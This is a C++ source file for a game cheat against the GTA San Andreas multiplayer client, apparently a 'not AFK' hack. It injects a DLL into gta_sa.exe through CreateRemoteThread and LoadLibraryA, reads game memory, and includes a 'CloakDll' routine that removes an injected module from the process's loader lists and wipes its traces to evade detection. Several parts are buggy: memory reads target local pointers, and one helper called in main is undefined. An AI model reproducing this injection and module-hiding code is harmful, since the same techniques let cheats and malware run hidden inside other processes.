#include <Windows.h>
#include <iostream>
#include <string>
#include "mapping.h"
#include <winnt.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

#define UPPERCASE(x) if((x) >= 'a' && (x) <= 'z') (x) -= 'a' - 'A'
#define UNLINK(x) (x).Blink->Flink = (x).Flink; \
   (x).Flink->Blink = (x).Blink;

void* samp_dll = NULL;
DWORD dwSAMP_Addr = NULL;
HANDLE hProc;

void getSampAddress()
{
	samp_dll = NULL;
	void* remote_buffer  = VirtualAllocEx(hProc, NULL, sizeof("SAMP.dll"),MEM_COMMIT, PAGE_READWRITE);
	if (remote_buffer != NULL) 
	{
		SIZE_T bytes_written = 0;
		WriteProcessMemory(hProc, remote_buffer, "SAMP.dll", sizeof("SAMP.dll"), &bytes_written);
		DWORD thread_id = 0;
		HMODULE kernel32 = GetModuleHandleA("Kernel32");
		LPTHREAD_START_ROUTINE remote_lla = reinterpret_cast <LPTHREAD_START_ROUTINE> (GetProcAddress(kernel32, "GetModuleHandleA"));
		if (remote_lla != NULL) 
		{
			HANDLE thread = CreateRemoteThread(hProc, NULL, 0, remote_lla, reinterpret_cast <void*> (remote_buffer), 0,&thread_id);
			if (thread != NULL && thread_id != 0) 
			{
				WaitForSingleObject(thread, 5000);
				DWORD exit_code = 0;
				GetExitCodeThread(thread, &exit_code);
				if(exit_code != 0)
				{
					samp_dll = reinterpret_cast <void*> (exit_code);
					if(samp_dll != NULL)
					{
						
					}
					else
					{
						printf("Error: invalid samp address\n");
					}
				}
				else
				{
					printf("Error: invalid exit code\n");
				}
			}
		}
		VirtualFreeEx(hProc, remote_buffer, sizeof("SAMP.dll") + 1, MEM_RELEASE);
	}
	else
	{
		printf("Error: invalid remote buffer\n");
	}
}


DWORD add_textdraw_pool = NULL;

void getSampTextDraws()
{
	DWORD info_offset = 0x2071A8;
	DWORD read_mem = (DWORD)samp_dll;
	read_mem += info_offset;
	//read_mem += 940;
	DWORD samp_info = NULL;
	ReadProcessMemory(hProc,&read_mem,&samp_info,sizeof(samp_info),0);
	if(samp_info != NULL)
	{
		DWORD samp_pools = NULL;
		read_mem = samp_info;
		ReadProcessMemory(hProc,&read_mem,&samp_pools,sizeof(samp_pools),0);
		if(samp_pools != NULL)
		{
			DWORD textdraw_pool = NULL;
			read_mem = samp_pools;
			read_mem += 16;
			ReadProcessMemory(hProc,&read_mem,&textdraw_pool,sizeof(textdraw_pool),0);
			if(textdraw_pool != NULL)
			{
				add_textdraw_pool = textdraw_pool;
			}
			else
			{
				printf("Error: invalid textdraw pool address\n");
			}
		}
		else
		{
			printf("Error: invalid samp pools address\n");
		}
	}
	else
	{
		printf("Error: invalid samp info address\n");
	}

}

struct stTextdraw
{
	    char            text[1024]; 
        char            unknown[2087]; 
        unsigned int    ulStyle; 
        float           position[2]; 
        char            unknown_[16];
        signed int		iStyleFourID;
};


stTextdraw getTextdraw(int id)
{
	stTextdraw td;

	DWORD read_mem = NULL;
	if(add_textdraw_pool != NULL)
	{
		DWORD dwTD = NULL;
		read_mem = add_textdraw_pool;
		read_mem += 2048 * sizeof(int);
		read_mem += id*4;
		ReadProcessMemory(hProc,&read_mem,&dwTD,sizeof(dwTD),0);
		if(dwTD != NULL)
		{
			char text[1024] = { 0 };
			char unknown[2087] = { 0 };
			unsigned int ulStyle = 0;
			float position[2] = { 0 };
			char unknown_[16] = { 0 };
			signed int iStyleFourID = 0;

			read_mem = dwTD;

			SIZE_T written = NULL;
			ReadProcessMemory(hProc,&read_mem,&td.text,sizeof(td.text),&written);
			
			read_mem += sizeof(td.text);
			ReadProcessMemory(hProc,&read_mem,&td.unknown,sizeof(td.unknown),&written);

			read_mem += sizeof(td.unknown);
			ReadProcessMemory(hProc,&read_mem,&td.ulStyle,sizeof(td.ulStyle),&written);

			read_mem += sizeof(td.ulStyle);
			ReadProcessMemory(hProc,&read_mem,&td.position,sizeof(td.position),&written);

			read_mem += sizeof(td.position);
			ReadProcessMemory(hProc,&read_mem,&unknown_,sizeof(unknown_),&written);

			read_mem += sizeof(td.unknown_);
			ReadProcessMemory(hProc,&read_mem,&td.iStyleFourID,sizeof(td.iStyleFourID),&written);

			if(td.position[0] != 0)
				printf("%s\n",td.text);
		}
		else
		{
			printf("Error: invalid textdraw address\n");
		}
	}
	else
	{
		printf("Error: invalid textdraw pool address\n");
		printf("VirtualAllocEx failed! Error: %d\n", GetLastError());
	}
	return td;
}

bool EnableDebugPrivilege() 
{ 
    HANDLE hThis = GetCurrentProcess(); 
    HANDLE hToken; 
    OpenProcessToken(hThis, TOKEN_ADJUST_PRIVILEGES, &hToken); 
    LUID luid; 
    LookupPrivilegeValue(0, TEXT("seDebugPrivilege"), &luid); 
    TOKEN_PRIVILEGES priv; 
    priv.PrivilegeCount = 1; 
    priv.Privileges[0].Luid = luid; 
    priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
    AdjustTokenPrivileges(hToken, false, &priv, 0, 0, 0); 
    CloseHandle(hToken); 
    CloseHandle(hThis); 
    return true; 
} 

   
#pragma pack(push, 1)

typedef struct _UNICODE_STRING {
  USHORT  Length;
  USHORT  MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _ModuleInfoNode
{
   LIST_ENTRY LoadOrder;
   LIST_ENTRY InitOrder;
   LIST_ENTRY MemoryOrder;
   HMODULE baseAddress;      //   Base address AKA module handle
   unsigned long entryPoint;
   unsigned int size;         //   Size of the modules image
   UNICODE_STRING fullPath;
   UNICODE_STRING name;
   unsigned long flags;
   unsigned short LoadCount;
   unsigned short TlsIndex;
   LIST_ENTRY HashTable;   //   A linked list of any other modules that have the same first letter
   unsigned long timestamp;
} ModuleInfoNode, *pModuleInfoNode;

typedef struct _ProcessModuleInfo
{
   unsigned int size;         //   Size of a ModuleInfo node?
   unsigned int initialized;
   HANDLE SsHandle;
   LIST_ENTRY LoadOrder;
   LIST_ENTRY InitOrder;
   LIST_ENTRY MemoryOrder;
} ProcessModuleInfo, *pProcessModuleInfo;

#pragma pack(pop)

bool CloakDll_stub(HMODULE);
void CD_stubend();

bool CloakDll(char *, char *);
unsigned long GetProcessIdFromProcname(char *);
HMODULE GetRemoteModuleHandle(unsigned long, char *);

bool CloakDll(char *process, char *dllName)
{
   PathStripPath(dllName);

   unsigned long procId;
   procId = GetProcessIdFromProcname(process);
   HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procId);

   //   Calculate the length of the stub by subtracting it's address
   //   from the beginning of the function directly ahead of it.
   //
   //   NOTE: If the compiler compiles the functions in a different
   //   order than they appear in the code, this will not work as
   //   it's supposed to.  However, most compilers won't do that.
   unsigned int stubLen = (unsigned long)CD_stubend - (unsigned long)CloakDll_stub;

   //   Allocate space for the CloakDll_stub function
   void *stubAddress = VirtualAllocEx(hProcess,
      NULL,
      stubLen,
      MEM_RESERVE | MEM_COMMIT,
      PAGE_EXECUTE_READWRITE);

   //   Write the stub's code to the page we allocated for it
   WriteProcessMemory(hProcess, stubAddress, CloakDll_stub, stubLen, NULL);

   HMODULE hMod = GetRemoteModuleHandle(procId, dllName);

   //   Create a thread in the remote process to execute our code
   CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)stubAddress, hMod, 0, NULL);

   //   Clean up after ourselves, so as to leave as little impact as possible
   //   on the remote process
   VirtualFreeEx(hProcess, stubAddress, stubLen, MEM_RELEASE);
   return true;
}

bool CloakDll_stub(HMODULE hMod)
{
   ProcessModuleInfo *pmInfo;
   ModuleInfoNode *module;

   _asm
   {
      mov eax, fs:[18h]      // TEB
      mov eax, [eax + 30h]   // PEB
      mov eax, [eax + 0Ch]   // PROCESS_MODULE_INFO
      mov pmInfo, eax
   }

    module = (ModuleInfoNode *)(pmInfo->LoadOrder.Flink);
   
   while(module->baseAddress && module->baseAddress != hMod)
      module = (ModuleInfoNode *)(module->LoadOrder.Flink);

   if(!module->baseAddress)
      return false;

   //   Remove the module entry from the list here
   ///////////////////////////////////////////////////   
   //   Unlink from the load order list
   UNLINK(module->LoadOrder);
   //   Unlink from the init order list
   UNLINK(module->InitOrder);
   //   Unlink from the memory order list
   UNLINK(module->MemoryOrder);
   //   Unlink from the hash table
   UNLINK(module->HashTable);

   //   Erase all traces that it was ever there
   ///////////////////////////////////////////////////

   //   This code will pretty much always be optimized into a rep stosb/stosd pair
   //   so it shouldn't cause problems for relocation.
   //   Zero out the module name
   memset(module->fullPath.Buffer, 0, module->fullPath.Length);
   //   Zero out the memory of this module's node
   memset(module, 0, sizeof(ModuleInfoNode));   

   return true;
}

__declspec(naked) void CD_stubend() { }

unsigned long GetProcessIdFromProcname(char *procName)
{
   PROCESSENTRY32 pe;
   HANDLE thSnapshot;
   BOOL retval, ProcFound = false;

   thSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

   if(thSnapshot == INVALID_HANDLE_VALUE)
   {
      MessageBox(NULL, "Error: unable to create toolhelp snapshot", "Loader", NULL);
      return false;
   }

   pe.dwSize = sizeof(PROCESSENTRY32);

    retval = Process32First(thSnapshot, &pe);

   while(retval)
   {
      if(StrStrI(pe.szExeFile, procName) )
      {
         ProcFound = true;
         break;
      }

      retval    = Process32Next(thSnapshot,&pe);
      pe.dwSize = sizeof(PROCESSENTRY32);
   }

   return pe.th32ProcessID;
}

int main()
{
	EnableDebugPrivilege();
	DWORD ProcessID = GetProcessIdByName("gta_sa.exe");
	HANDLE Proc=OpenProcess(PROCESS_ALL_ACCESS,FALSE,ProcessID);
	LPVOID LoadLibAddy=(LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"),"LoadLibraryA");

	LPVOID RemoteString=(LPVOID)VirtualAllocEx(Proc, NULL, 
		strlen("C:\\Users\\Alex\\Documents\\Visual Studio 11\\Projects\\GRPNotAfk\\Release\\hack.dll"),
		MEM_RESERVE|MEM_COMMIT,PAGE_READWRITE);

	WriteProcessMemory(Proc,(LPVOID)RemoteString,"C:\\Users\\Alex\\Documents\\Visual Studio 11\\Projects\\GRPNotAfk\\Release\\hack.dll",
		strlen("C:\\Users\\Alex\\Documents\\Visual Studio 11\\Projects\\GRPNotAfk\\Release\\hack.dll"),NULL); 

	CreateRemoteThread(Proc,NULL,NULL,(LPTHREAD_START_ROUTINE)LoadLibAddy,(LPVOID)RemoteString,NULL,NULL);

	while(true)
	{
		Sleep(10);
	}

}